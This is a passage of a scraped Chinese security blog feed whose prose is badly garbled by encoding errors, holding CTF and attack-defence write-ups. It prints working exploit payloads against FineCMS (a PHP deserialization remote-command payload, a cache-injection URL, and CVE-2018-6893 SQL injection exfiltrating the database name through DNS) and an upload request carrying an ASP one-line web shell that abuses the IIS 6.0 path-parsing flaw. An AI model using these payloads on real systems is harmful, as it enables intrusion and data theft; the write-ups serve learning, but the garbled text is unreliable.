å‚ï¼Œæœ‰çš„è¯å°±è®¿é—®$config-\u0026gt;$paramã€‚\nè€Œåœ¨SetFilter($value)å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰call_user_func($filter,$value);ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚\ncall_user_func(\u0026#39;system\u0026#39;,\u0026#39;ls\u0026#39;); å¦‚æ­¤å¯ä»¥ç›´æ¥æ‰§è¡Œsystem(ls)ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©call_user_func($filter,$value);ä¸­çš„å‚æ•°\n$filter = \u0026#39;system\u0026#39;;//$valueå³ä¸ºå‡½æ•°ä¼ å‚ æ‰€ä»¥æˆ‘ä»¬å…ˆæ„é€ ä¸€ä¸ª$FinecmsConfigå¯¹è±¡å®ä¾‹ï¼Œå°†å…¶åºåˆ—åŒ–ã€‚\nclass FinecmsConfig{ private $config; private $path; public $filter=array(\u0026#39;system\u0026#39;); } $fine = new FinecmsConfig(); echo base64_encode(serialize($fine)); å°†å¾—åˆ°çš„base64åŠ å¯†åçš„å­—ç¬¦ä¸²ä¼ å…¥$configï¼Œä¼ å…¥å‚æ•°$paramå®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n$config = \u0026#39;TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ==\u0026#39;; $param = \u0026#39;ls\u0026#39;; $config = unserialize(base64_decode($config)); if(isset($param)){ $config-\u0026gt;$param; } åœ¨è¿™é‡Œï¼Œååºåˆ—åŒ–ä¹‹åè°ƒç”¨çš„__wakeup()è¿™ä¸ªé­”æœ¯å‡½æ•°ï¼Œè€Œä¸Šæ®µä»£ç ä¸­å¹¶æ²¡æœ‰ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šäº§ç”Ÿä»€ä¹ˆå½±å“ã€‚\n è‹¥è¢«è§£åºåˆ—åŒ–çš„å˜é‡æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œåœ¨æˆåŠŸåœ°é‡æ–°æ„é€ å¯¹è±¡ä¹‹åï¼ŒPHP ä¼šè‡ªåŠ¨åœ°è¯•å›¾å»è°ƒç”¨Â __wakeup()Â æˆå‘˜å‡½æ•°ï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰ã€‚\n å¥½ï¼Œæˆ‘ä»¬å…¨éƒ¨æ¢³ç†ä¸€éï¼ŒçœŸæ­£åˆ©ç”¨çš„ç‚¹å°±æ˜¯åœ¨SetFilteråˆ©ç”¨call_user_funcè¿™ä¸ªå‡½æ•°ï¼Œè€Œè°ƒç”¨SetFilterçš„å‡½æ•°å°±æ˜¯__get()è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œè¿™ä¸ªé­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶æ˜¯ï¼š\n å½“è°ƒç”¨å½“å‰ç¯å¢ƒä¸‹æœªå®šä¹‰æˆ–ä¸å¯è§çš„ç±»å±æ€§æˆ–æ–¹æ³•æ—¶ï¼Œé‡è½½æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚\nä¹Ÿå°±æ˜¯è¯´å¦‚æœæˆ‘ä»¬è®¿é—®ä¸€ä¸ªå®ä¾‹ä¸å­˜åœ¨çš„æˆå‘˜ï¼Œæˆ–è€…ç§æœ‰æˆå‘˜å˜é‡çš„è¯ï¼Œå°±ä¼šè§¦å‘\n æ‰€ä»¥ï¼Œ$config-\u0026gt;$param;åœ¨è¿™é‡Œè§¦å‘ï¼Œè€Œ$paramå¯æ§ï¼Œè€Œä¸”å®ƒä¹Ÿä½œä¸ºæ˜¯call_user_funcçš„ä¼ å…¥å›è°ƒå‡½æ•°çš„å‚æ•°ï¼Œå°±é€ æˆäº†ä»»æ„ä»£ç åˆ©ç”¨\næ‰€ä»¥æ•´ä¸ªä»£ç çš„æ¼æ´åˆ©ç”¨ï¼Œåº”è¯¥æ˜¯å…ˆæ„é€ ä¸€ä¸ª$filter=array('system')çš„FinecmsConfigå®ä¾‹ï¼Œå› ä¸ºåŸä»£ç ä¸­æ˜¯éœ€è¦å…ˆbase64è§£ç ä¹‹åå†ååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å°±å…ˆå°†å…¶åºåˆ—åŒ–ä¹‹åå†ç”¨base64åŠ å¯†ï¼Œå¾—åˆ°\nTzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtOO3M6MTk6IgBGaW5lY21zQ29uZmlnAHBhdGgiO3M6NDoicGF0aCI7czo2OiJmaWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fQ== å³å¯ç”¨GETå‚æ•°paramä»»æ„å‘½ä»¤æ‰§è¡Œã€‚\nPoc 4 è¯¦ç»†è§ï¼š\n https://zhuanlan.zhihu.com/p/35133267\nhttp://lu4n.com/finecms-rce-0day/\n payload:\nhttp://localhost/index.php?c=Api\u0026amp;m=html\u0026amp;name=search\u0026amp;format=html\u0026amp;params={\u0026quot;search_sql\u0026quot;:\u0026quot;action=cache name=block.L]=phpinfo()\u0026amp;$cache[L\u0026quot;} Poc 5 cmsè‡ªå¸¦æ¼æ´ï¼šç¼–å·CVE-2018-6893\nè¯¦ç»†è§ï¼š\n https://bbs.ichunqiu.com/thread-36673-1-1.html\n  /index.php?s=member\u0026amp;c=api\u0026amp;m=checktitle\u0026amp;id=13\u0026amp;title=123\u0026amp;module=news,(selectload_file(concat(0x5c5c5c5c,database(),0x2e6e65766a32372e636579652e696f5c5c616461)))as total\n æ€»ç»“ ä¸»è¦æ˜¯è‡ªå·±åœ¨è¿™æ–¹é¢ç§¯ç´¯çš„å¹¶ä¸å¤šå§ï¼Œè¥¿æ¹–é‚£æ¬¡è¯´å®è¯ç¡®å®æœ‰ç‚¹æ°´åˆ†ï¼ŒæŒºä½œç§€çš„ã€‚æ¯”èµ›æ°´å¹³å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œè‡ªå·±è·Ÿé˜Ÿå‹ä¹Ÿæ˜¯æ··åˆ°äº†ç¬¬6å·¦å³ï¼Œä¹Ÿæ˜¯ä¸ªäººçš„ç¬¬äºŒæ¬¡æ”»é˜²èµ›ï¼›ç¬¬ä¸‰æ¬¡æ”»é˜²èµ›ç¨å¾®å¯¹ä¸Šæ¬¡æœ‰ç‚¹ç»éªŒï¼Œä¸è¿‡è¿˜æ˜¯è‡ªå·±è§è¯†å¤ªå°‘äº†ï¼Œå¤ªèœäº†\u0026hellip;æ’åæ¯”è¾ƒé ä¸­ï¼Œä¹Ÿæ˜¯å› ä¸ºéƒ½æ˜¯é€šè¿‡çº¿ä¸Šèµ›ç­›é€‰è¿‡æ¥çš„é˜Ÿä¼ï¼Œæ‰€ä»¥å®åŠ›éƒ½å¾ˆå¼ºã€‚ä¸å¾—ä¸è¯´çš„æ˜¯ï¼Œçº¢å¸½æ¯çš„web2çš„checkeråªæ£€æŸ¥index.phpå’Œadmin.phpï¼Œæˆ‘ä»¬åˆ äº†å¾ˆå¤šå…¶ä»–ä¸œè¥¿ï¼Œå°±ç¨³å®šå¾—åˆ†äº†ã€‚ã€‚ä¸€æ–¹é¢æ˜¯è®°å½•æµé‡çš„å‡†å¤‡ä¸æ˜¯å¾ˆå……åˆ†ï¼Œwafä¹Ÿå¹¶æ²¡æœ‰å‡†å¤‡ï¼ŒåŸºæœ¬å°±æ˜¯å‡†å¤‡äº†ä¸€äº›å¿ƒç†å‡†å¤‡å§hhhhã€‚å¯¹äºä¸æ­»é©¬çš„å¤„ç†ä»¥åŠå¯¹äºè‡ªå·±å¯¹è‡ªå·±çš„ç»´æŠ¤ç¯å¢ƒæ²¡æœ‰æƒé™çš„æƒ…å†µæ²¡æœ‰ç»éªŒï¼Œè¿™é‡Œå¯ä»¥ç®€è¿°ä¸€ä¸‹å‰é¢ä¸¤è€…çš„å¤„ç†æ–¹æ³•ï¼Œä¸æ­»é©¬çš„å¤„ç†å¯ä»¥é€šè¿‡è¦†å†™ä¸€å¥è¯é©¬çš„æ–‡ä»¶æˆ–è€…é‡å¯webæœåŠ¡ï¼Œå¯¹äºè‡ªå·±webç›®å½•æ²¡æœ‰æƒé™çš„æƒ…å†µå¯ä»¥è‡ªå·±æ‹¿è‡ªå·±çš„shellè¾¾åˆ°è·å–æƒé™çš„ç›®çš„ã€‚\nä¹‹åå¯èƒ½ä¼šå†™ä¸€å†™æ”»é˜²èµ›çš„ç»éªŒæ€»ç»“å§\u0026hellip;è¿˜æ˜¯å¾—ç­‰è¿™æ®µæœŸæœ«è¿‡å§..\n","date":"2018-06-27T19:28:00Z","permalink":"https://blog.zeddyu.info/2018/06/27/%E8%AE%B0%E5%87%A0%E6%AC%A1%E6%94%BB%E9%98%B2%E8%B5%9B/","title":"è®°å‡ æ¬¡æ”»é˜²èµ›"},{"content":"åœ¨æŸé¶åœºåšé¢˜çš„æ—¶å€™å‘ç°æœ‰ä¸ªçŸ¥è¯†ç›²åŒºï¼Œé¡ºæ‰‹è®°ä¸€è®°ã€‚\nä¿¡æ¯æ”¶é›† é¡µé¢éå¸¸ç®€å•ï¼Œå°±ä¸€ä¸ªä¸Šä¼ çš„é€‰æ‹©æ¡†ä»¥åŠç‚¹å‡»ä¸Šä¼ ï¼Œæ²¡æœ‰å‰ç«¯è¿‡æ»¤ã€‚ç”±äºåšphpçš„é¢˜æ€»æ˜¯å¤ªä¹ æƒ¯äº†ï¼Œæ ¹æœ¬æ²¡å¤ªæ³¨æ„å›åº”å¤´çš„å†…å®¹\nServer: Microsoft-IIS/6.0 è¿™é‡Œç”¨çš„IISåšæœåŠ¡å™¨ï¼Œè€Œä¸”ä¸Šä¼ é¡µé¢è¿˜æ˜¯ä¸ªaspé¡µé¢ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªaspé©¬ä¸Šä¼ ä¸Šå»å°±å¥½äº†ã€‚\nè¯•æ¢ è¿™é“é¢˜çš„ä¸Šä¼ é€»è¾‘æ˜¯å…ˆæ£€æŸ¥ä½ çš„åç¼€åï¼Œåªè¦ä¸æ˜¯åœ¨æœåŠ¡ç«¯å…è®¸çš„ç™½åå•ä¹‹å†…å°±æ‹’ç»ä¸Šä¼ ã€‚äºæ˜¯æˆ‘ä»¬åªèƒ½æ”¹åç¼€è¿›è¡Œä¸Šä¼ ã€‚ä¸è¿‡è¿˜æœ‰ä¸ªç‚¹æ˜¯ä»–ä¸Šä¼ å®Œä»¥åï¼Œè¿˜ä¼šå°†ä½ çš„æ–‡ä»¶åæ”¹æˆä¸Šä¼ æ—¶é—´ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä¸ªè¿™ä¹ˆä¸ªæƒ…å†µ\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;æ–‡ä»¶ä¸Šä¼ \u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=gb2312\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Language\u0026#34; Content=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body leftmargin=\u0026#34;10\u0026#34; topmargin=\u0026#34;10\u0026#34; bgcolor=\u0026#34;#FFFFFF\u0026#34;\u0026gt; å†…éƒ¨åŠå…¬æ–‡ä»¶ä¸Šä¼ å…¥å£\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;ä¸Šä¼ æ–‡ä»¶ï¼š/shell-asp.jpg\u0026lt;br\u0026gt;æ–‡ä»¶å¤§å°ï¼š25 å­—èŠ‚\u0026lt;br\u0026gt;è¿”å›åœ°å€ï¼šupload/2018626032150.jpg \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;å…± 1 ä¸ªæ–‡ä»¶æˆåŠŸä¸Šä¼ åˆ°æœåŠ¡å™¨! \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34; è¿” å› \u0026#34; onclick=\u0026#34;javascript:history.back();\u0026#34;\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; å½“æ—¶æƒ³ç”¨%00å•¥çš„ç»•è¿‡ï¼Œå‘ç°æ ¹æœ¬ä¸å¯èƒ½ï¼Œå› ä¸ºä»–ä¼šæŠŠä½ ä¸Šä¼ ä¹‹åçš„æ–‡ä»¶åæ”¹æ‰ï¼Œæ‰€ä»¥æ ¹æœ¬ä¸å¯èƒ½ç”¨è¿™ä¸ªæ–¹æ³•ã€‚\nè§£å†³ çœ‹äº†ä¸€ä¸‹hintæç¤ºäº†å…³æ³¨æœåŠ¡å™¨ç±»å‹ï¼Œç„¶åå°±æ³¨æ„åˆ°äº†Server: Microsoft-IIS/6.0ï¼Œè¿™é‡Œå¯ä»¥ç”¨iisçš„ä¸€ä¸ªè·¯å¾„è§£ææ¼æ´ã€‚\n ä½¿ç”¨iis5.x-6.xç‰ˆæœ¬çš„æœåŠ¡å™¨ï¼Œå¤§å¤šä¸ºwindows server 2003ï¼Œç½‘ç«™æ¯”è¾ƒå¤è€ï¼Œå¼€å‘è¯­å¥ä¸€èˆ¬ä¸ºaspï¼›è¯¥è§£ææ¼æ´ä¹Ÿåªèƒ½è§£æaspæ–‡ä»¶ï¼Œè€Œä¸èƒ½è§£æaspxæ–‡ä»¶ã€‚\nç›®å½•è§£æ(6.0) å½¢å¼ï¼šwww.xxx.com/xx.asp/xx.jpg åŸç†: æœåŠ¡å™¨é»˜è®¤ä¼šæŠŠ.aspï¼Œ.asaç›®å½•ä¸‹çš„æ–‡ä»¶éƒ½è§£ææˆaspæ–‡ä»¶ã€‚\næ–‡ä»¶è§£æ å½¢å¼ï¼šwww.xxx.com/xx.asp;.jpg åŸç†ï¼šæœåŠ¡å™¨é»˜è®¤ä¸è§£æ;å·åé¢çš„å†…å®¹ï¼Œå› æ­¤xx.asp;.jpgä¾¿è¢«è§£ææˆaspæ–‡ä»¶äº†ã€‚\nè§£ææ–‡ä»¶ç±»å‹ IIS6.0 é»˜è®¤çš„å¯æ‰§è¡Œæ–‡ä»¶é™¤äº†aspè¿˜åŒ…å«è¿™ä¸‰ç§ : /test.asa /test.cer /test.cdx\n è¿™é‡Œä¸€å¼€å§‹æˆ‘ä¹Ÿå‚»é€¼åœ°è¿˜å…‰é¡¾ç€å»æ”¹æ–‡ä»¶åå»åˆ©ç”¨è§£ææ¼æ´ï¼Œè¯•è¿‡ä¸€æ¬¡æ‰å‘ç°æ–‡ä»¶åæ˜¯ä¸€ç›´è¢«å¯¹æ–¹æ§åˆ¶çš„ã€‚\nè®¤çœŸçœ‹è¯·æ±‚ä¸»ä½“å¯ä»¥å‘ç°\n------WebKitFormBoundaryz7FvAglTc7ApQHRX Content-Disposition: form-data; name=\u0026quot;act\u0026quot; upload ------WebKitFormBoundaryz7FvAglTc7ApQHRX Content-Disposition: form-data; name=\u0026quot;upcount\u0026quot; 1 ------WebKitFormBoundaryz7FvAglTc7ApQHRX Content-Disposition: form-data; name=\u0026quot;GuFolderPath\u0026quot; upload ------WebKitFormBoundaryz7FvAglTc7ApQHRX Content-Disposition: form-data; name=\u0026quot;file1\u0026quot;; filename=\u0026quot;/shell-asp.asp/1.jpg\u0026quot; Content-Type: application/octet-stream \u0026lt;%eval request(\u0026quot;value\u0026quot;)%\u0026gt; ------WebKitFormBoundaryz7FvAglTc7ApQHRX Content-Disposition: form-data; name=\u0026quot;Submit\u0026quot; ------WebKitFormBoundaryz7FvAglTc7ApQHRX-- ä¸­é—´æœ‰ä¸¤ä¸ªuploadï¼Œè¿™æ ·å­ï¼Œæˆ‘è”æƒ³åˆ°ä¹‹å‰åšè¿‡çš„ï¼Œè¿™å¿…å®šå°±æ˜¯ä¸Šä¼ è·¯å¾„æ— ç–‘äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å°†å…¶æ”¹æˆupload/xxx.aspé…åˆè§£ææ¼æ´åˆ©ç”¨å°±å¯ä»¥è¿ä¸Šshelläº†ï¼Œä¿®æ”¹å®Œæˆåä¸Šä¼ è¿”å›\n\u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;æ–‡ä»¶ä¸Šä¼ \u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html;charset=gb2312\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Language\u0026#34; Content=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body leftmargin=\u0026#34;10\u0026#34; topmargin=\u0026#34;10\u0026#34; bgcolor=\u0026#34;#FFFFFF\u0026#34;\u0026gt; å†…éƒ¨åŠå…¬æ–‡ä»¶ä¸Šä¼ å…¥å£\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;ä¸Šä¼ æ–‡ä»¶ï¼š/shell-asp.asp/1.jpg\u0026lt;br\u0026gt;æ–‡ä»¶å¤§å°ï¼š25 å­—èŠ‚\u0026lt;br\u0026gt;è¿”å›åœ°å€ï¼šupload/1.asp/2018626032150.jpg \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;å…± 1 ä¸ªæ–‡ä»¶æˆåŠŸä¸Šä¼ åˆ°æœåŠ¡å™¨! \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type=\u0026#34;button\u0026#34; value=\u0026#34; è¿” å› \u0026#34; onclick=\u0026#34;javascript:history.back();\u0026#34;\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; ç›´æ¥è®¿é—®è¿”å›åœ°å€çš„è·¯å¾„ï¼Œç”±äº6.0è§£ææ¼æ´ï¼Œè¿™ä¸ªåœ¨æœåŠ¡å™¨ä¸Šå³ä½¿æ˜¯å›¾ç‰‡ä¹Ÿè¢«å½“ä½œaspè§£æï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å¯ä»¥ä»¥upload/1.asp/2018626032150.jpgè¿ä¸Šshellæ‹¿åˆ°flag\næºç  è„¸ä¸Šshellåç‰¹åœ°å»æ‹¿äº†ä¸€æ³¢æºç ï¼ŒUpload.asp\n\u0026lt;%OPTION EXPLICIT%\u0026gt; \u0026lt;%Server.ScriptTimeOut=5000%\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;æ–‡ä»¶ä¸Šä¼ \u0026lt;/title\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html;charset=gb2312\u0026quot;\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Language\u0026quot; Content=\u0026quot;zh-CN\u0026quot;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body leftmargin=\u0026quot;10\u0026quot; topmargin=\u0026quot;10\u0026quot; bgcolor=\u0026quot;#FFFFFF\u0026quot;\u0026gt; \u0026lt;!-- #include file=\u0026quot;upload_5xsoft.inc\u0026quot; --\u0026gt; \u0026lt;% dim upload,file,formName,iCount,FolderNameNew dim GuFolderPath,fso,GuFolder0,GuFileSize0,GuFileExt0,GuAutoName set upload=new upload_5xsoft 'å»ºç«‹ä¸Šä¼ å¯¹è±¡ GuFolder0=\u0026quot;upload/\u0026quot; 'è®¾å®šé»˜è®¤ä¸Šä¼ çš„ç›®å½•ï¼Œå¿…é¡»ä»¥â€œ/â€ç»“æŸï¼Œå¯ä»¥ä¸ºç©º GuFileSize0=2048 'è®¾å®šé»˜è®¤å…è®¸ä¸Šä¼ çš„æœ€å¤§æ–‡ä»¶ï¼Œå•ä½:Kï¼Œ1024K=1M GuFileExt0=\u0026quot;bmp|gif|jpg|jpeg|png|swf|rar|zip|txt\u0026quot; 'è®¾å®šé»˜è®¤å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ GuAutoName=\u0026quot;1\u0026quot; 'è®¾å®šä¸Šä¼ æˆåŠŸåçš„æ–‡ä»¶åæ˜¯å¦è‡ªåŠ¨é‡æ–°å‘½åæˆ–æ˜¯ä½¿ç”¨åŸæ¥çš„åç§°ï¼Œ1ä¸ºæ˜¯ï¼Œ0ä¸ºå¦ Response.write upload.Version\u0026amp;\u0026quot;\u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026quot; 'æ˜¾ç¤ºä¸Šä¼ ç±»çš„ç‰ˆæœ¬ if upload.form(\u0026quot;GuFolderPath\u0026quot;)\u0026lt;\u0026gt;\u0026quot;\u0026quot; then GuFolderPath=upload.form(\u0026quot;GuFolderPath\u0026quot;) call FolderNameCheck(GuFolderPath) GuFolderPath=upload.form(\u0026quot;GuFolderPath\u0026quot;) if right(GuFolderPath,1)\u0026lt;\u0026gt;\u0026quot;/\u0026quot; then GuFolderPath=GuFolderPath\u0026amp;\u0026quot;/\u0026quot; elseif upload.form(\u0026quot;GuFolderPath\u0026quot;)=\u0026quot;\u0026quot; and GuFolder0\u0026lt;\u0026gt;\u0026quot;\u0026quot; then GuFolderPath=GuFolder0 call FolderNameCheck(GuFolderPath) GuFolderPath=GuFolder0 if right(GuFolderPath,1)\u0026lt;\u0026gt;\u0026quot;/\u0026quot; then GuFolderPath=GuFolderPath\u0026amp;\u0026quot;/\u0026quot; else GuFolderPath=\u0026quot;\u0026quot; end if iCount=0 for each formName in upload.objFile 'åˆ—å‡ºæ‰€æœ‰ä¸Šä¼ äº†çš„æ–‡ä»¶ set file=upload.file(formName) if file.FileSize\u0026gt;0 then dim FileExtF,FileExtY,FileExtOK,ii,jj FileExtF=split(File.FileName,\u0026quot;.\u0026quot;) for jj=0 to ubound(FileExtF) next FileExtY=0 FileExtOK=split(GuFileExt0,\u0026quot;|\u0026quot;) for ii=0 to ubound(FileExtOK) if FileExtOK(ii)=FileExtF(jj-1) then FileExtY=1 exit for end if next if FileExtY=0 then Htmend \u0026quot;ä¸Šä¼ å¤±è´¥ï¼Œä¸å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹\u0026quot; elseif file.FileSize\u0026gt;GuFileSize0*1024 then Htmend \u0026quot;ä¸Šä¼ å¤±è´¥ï¼Œå•ä¸ªæ–‡ä»¶å¤§å°è¶…è¿‡é™åˆ¶ï¼Œæœ€å¤§\u0026quot;\u0026amp;GuFileSize0\u0026amp;\u0026quot;*1024 å­—èŠ‚ï¼Œ1K=1024å­—èŠ‚\u0026quot; else dim FileNameOK if GuAutoName=\u0026quot;1\u0026quot; then FileNameOK=year(now)\u0026amp;month(now)\u0026amp;day(now)\u0026amp;hour(now)\u0026amp;minute(now)\u0026amp;second(now)\u0026amp;iCount\u0026amp;\u0026quot;.\u0026quot;\u0026amp;FileExtF(jj-1) else FileNameOK=file.FileName end if file.SaveAs Server.mappath(GuFolderPath\u0026amp;FileNameOK) 'ä¿å­˜æ–‡ä»¶ Response.write \u0026quot;ä¸Šä¼ æ–‡ä»¶ï¼š\u0026quot;\u0026amp;file.FileName\u0026amp;\u0026quot;\u0026lt;br\u0026gt;æ–‡ä»¶å¤§å°ï¼š\u0026quot;\u0026amp;file.FileSize\u0026amp;\u0026quot; å­—èŠ‚\u0026lt;br\u0026gt;è¿”å›åœ°å€ï¼š\u0026quot;\u0026amp;GuFolderPath\u0026amp;FileNameOK\u0026amp;\u0026quot; \u0026lt;br\u0026gt;\u0026quot; iCount=iCount+1 end if else Htmend \u0026quot;ä¸Šä¼ å¤±è´¥ï¼Œè¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶\u0026quot; end if set file=nothing next set upload=nothing Htmend \u0026quot;å…± \u0026quot;\u0026amp;iCount\u0026amp;\u0026quot; ä¸ªæ–‡ä»¶æˆåŠŸä¸Šä¼ åˆ°æœåŠ¡å™¨!\u0026quot; Sub FolderNameCheck(FolderNameNew) dim Letters,i,c Letters=\u0026quot;+=:;,[]\u0026lt;\u0026gt;\\|*?\u0026quot; for i=1 to len(FolderNameNew) c=mid(FolderNameNew,i,1) if inStr(Letters,c)\u0026lt;\u0026gt;0 then Htmend \u0026quot;ä¸Šä¼ å¤±è´¥ï¼Œæ–‡ä»¶å¤¹åç§°å«æœ‰ç‰¹æ®Šå­—ç¬¦\u0026quot; end if next GuFolderPath=server.MapPath(GuFolderPath) Set fso=Server.CreateObject(\u0026quot;Scripting.FileSystemObject\u0026quot;) if fso.FolderExists(GuFolderPath)=false then fso.CreateFolder(GuFolderPath) end if Set fso=nothing End sub Sub HtmEnd(Msg) set upload=nothing response.write \u0026quot;\u0026lt;br\u0026gt;\u0026quot;\u0026amp;Msg\u0026amp;\u0026quot; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt;\u0026lt;input type=\u0026quot;\u0026quot;button\u0026quot;\u0026quot; value=\u0026quot;\u0026quot; è¿” å› \u0026quot;\u0026quot; onclick=\u0026quot;\u0026quot;javascript:history.back();\u0026quot;\u0026quot;\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026quot; response.end End sub %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2018-06-26T19:52:14Z","permalink":"https://blog.zeddyu.info/2018/06/26/%E8%AE%B0%E4%B8%80%E9%81%93%E6%AF%94%E8%BE%83%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/","title":"è®°ä¸€é“æ¯”è¾ƒç®€å•çš„ä¸Šä¼ ç»•è¿‡"},{"content":"å‰äº›å¤©ä¸€ç›´åœ¨åˆ·é¢˜ï¼Œä¸è¿‡éƒ½æ˜¯ä¸€äº›æŒºç®€å•çš„ï¼Œç„¶åæœ‰å‡ é“éœ€è¦pythonè„šæœ¬çš„é¢˜å¯è°“æ˜¯æŠŠæˆ‘å¼„äº†ä¸€æ³¢ï¼Œè®¤è®¤çœŸçœŸåœ°å»å­¦ä¹ äº†ä¸€æ³¢pythonä»¥åŠæ­£åˆ™ã€‚å°±èŠä¸€ä¸‹è¿™å‡ é“é¢˜æ”¶è·å§ã€‚\nPython Requests é¦–å…ˆæ˜¯python requestsåº“çš„å­¦ä¹ \nå¯¹äºrequestçš„å›æ˜¾å¦‚æœæ˜¾ç¤ºä¹±ç çš„è¯ï¼Œå¯ä»¥æ·»åŠ \nrep.encoding = \u0026#39;utf-8\u0026#39; è¿›é˜¶ç”¨æ³•å¯ä»¥ç”¨\nr = requests.session() ç”¨æ¥ä¿æŒä¼šè¯ï¼Œä»¥åŠå¯ä»¥ç›´æ¥å®ç°å¸¦cookieäºŒæ¬¡è®¿é—®\n#æ¯”å¦‚ç¬¬ä¸€æ¬¡å»ºç«‹é“¾æ¥ rep = r.get(\u0026#39;xxx.com\u0026#39;) #ç¬¬äºŒæ¬¡éœ€è¦postæ•°æ®ï¼Œä»¥åŠä»¥ä¸Šæ¬¡çš„cookieè®¿é—® rep2 = r.post(\u0026#39;xxx.com\u0026#39;,data=data) è¿™å°±å¾ˆæ–¹ä¾¿äº†ï¼Œä¸éœ€è¦å†å•ç‹¬è®°å½•cookieæ¥ç¡®å®šæ˜¯åŒä¸€æ¬¡sessionäº†\nè¿˜æœ‰pythonçš„æ­£åˆ™åº“re\nimport re pattern = re.compile(r\u0026#39;^[^=]*\u0026#39;) match = pattern.match(yourString) if match: print match.group(0) åœ¨re.compileå¼•å·ä¸­è¾“å…¥ä½ çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶åè¿›è¡ŒåŒ¹é…\nexecã€evalã€represents execè¯­å¥ç”¨æ¥æ‰§è¡Œå‚¨å­˜åœ¨å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ä¸­çš„Pythonè¯­å¥ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿è¡Œæ—¶ç”Ÿæˆä¸€ä¸ªåŒ…å«Pythonä»£ç çš„å­—ç¬¦ä¸²ï¼Œç„¶åä½¿ç”¨execè¯­å¥æ‰§è¡Œè¿™äº›è¯­å¥ã€‚\nexec(\u0026#34;print(\u0026#39;Hello World\u0026#39;)\u0026#34;) è¿è¡Œç»“æœï¼š\n Hello World\n evalè¯­å¥ç”¨æ¥è®¡ç®—å­˜å‚¨åœ¨å­—ç¬¦ä¸²ä¸­çš„æœ‰æ•ˆPythonè¡¨è¾¾å¼ã€‚\neval_r(\u0026#34;2 * 3\u0026#34;) è¿è¡Œç»“æœï¼š\n 6\n reprå‡½æ•°ç”¨æ¥å–å¾—å¯¹è±¡çš„è§„èŒƒå­—ç¬¦ä¸²è¡¨ç¤ºã€‚æ³¨æ„ï¼Œåœ¨å¤§å¤šæ•°æ—¶å€™æœ‰eval_r(repr(object)) == objectã€‚\nå¯ä»¥å‚è€ƒPythonä¸­reprä¸stråŒºåˆ«\næ‰§è¡Œshellå‘½ä»¤   os.system\nosæ¨¡å—ä¸­çš„os.system()è¿™ä¸ªå‡½æ•°æ¥æ‰§è¡Œshellå‘½ä»¤\nos.system('ls')\nè¾“å‡ºç»“æœï¼š\n Appalication Desktop\tDownloads\n print os.system('mkdir test')\nè¾“å‡ºç»“æœ:\n 0\n 